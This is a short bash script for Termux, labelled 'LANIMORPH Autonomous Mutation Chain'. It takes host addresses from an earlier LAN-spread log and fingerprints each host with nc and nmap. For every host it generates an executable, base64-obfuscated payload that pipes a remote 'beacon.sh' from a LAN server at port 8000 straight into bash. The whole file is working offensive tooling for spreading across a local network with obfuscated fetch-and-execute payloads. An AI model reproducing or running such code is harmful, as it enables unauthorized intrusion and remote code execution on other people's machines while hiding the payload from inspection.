#!/data/data/com.termux/files/usr/bin/bash
# === LANIMORPH Autonomous Mutation Chain ===
mkdir -p ~/LANIMORPH/results ~/LANIMORPH/mutated

log_file=~/LANIMORPH/results/mutants_$(date +%Y%m%d_%H%M%S).log
hosts=$(awk '{print $NF}' ~/lan_spread_results/launch_log.txt | sort -u)

for ip in $hosts; do
  echo "[*] Scanning $ip..." | tee -a "$log_file"

  # === Basic fingerprint (OS banner + open ports)
  banner=$(timeout 2 bash -c "nc -v -n $ip 22 2>&1 | head -n1")
  open_ports=$(timeout 2 bash -c "nmap -p 22,80,443 $ip | grep open | awk '{print \$1}'" | xargs | tr ' ' ',')

  tag=$(echo "$banner | $open_ports" | md5sum | cut -c1-8)
  out=~/LANIMORPH/mutated/payload_${ip//./_}_$tag.sh

  # === Mutation: embed fingerprint into obfuscated payload
  base_cmd="curl -s http://192.168.1.33:8000/beacon.sh | bash # $ip :: $banner :: $open_ports"
  b64=$(echo "$base_cmd" | base64)
  echo -e "#!/bin/bash\necho '$b64' | base64 -d | bash" > "$out"
  chmod +x "$out"

  echo "[+] Generated $out" | tee -a "$log_file"
done

echo "[✓] Mutation chain complete. Results in: $log_file"
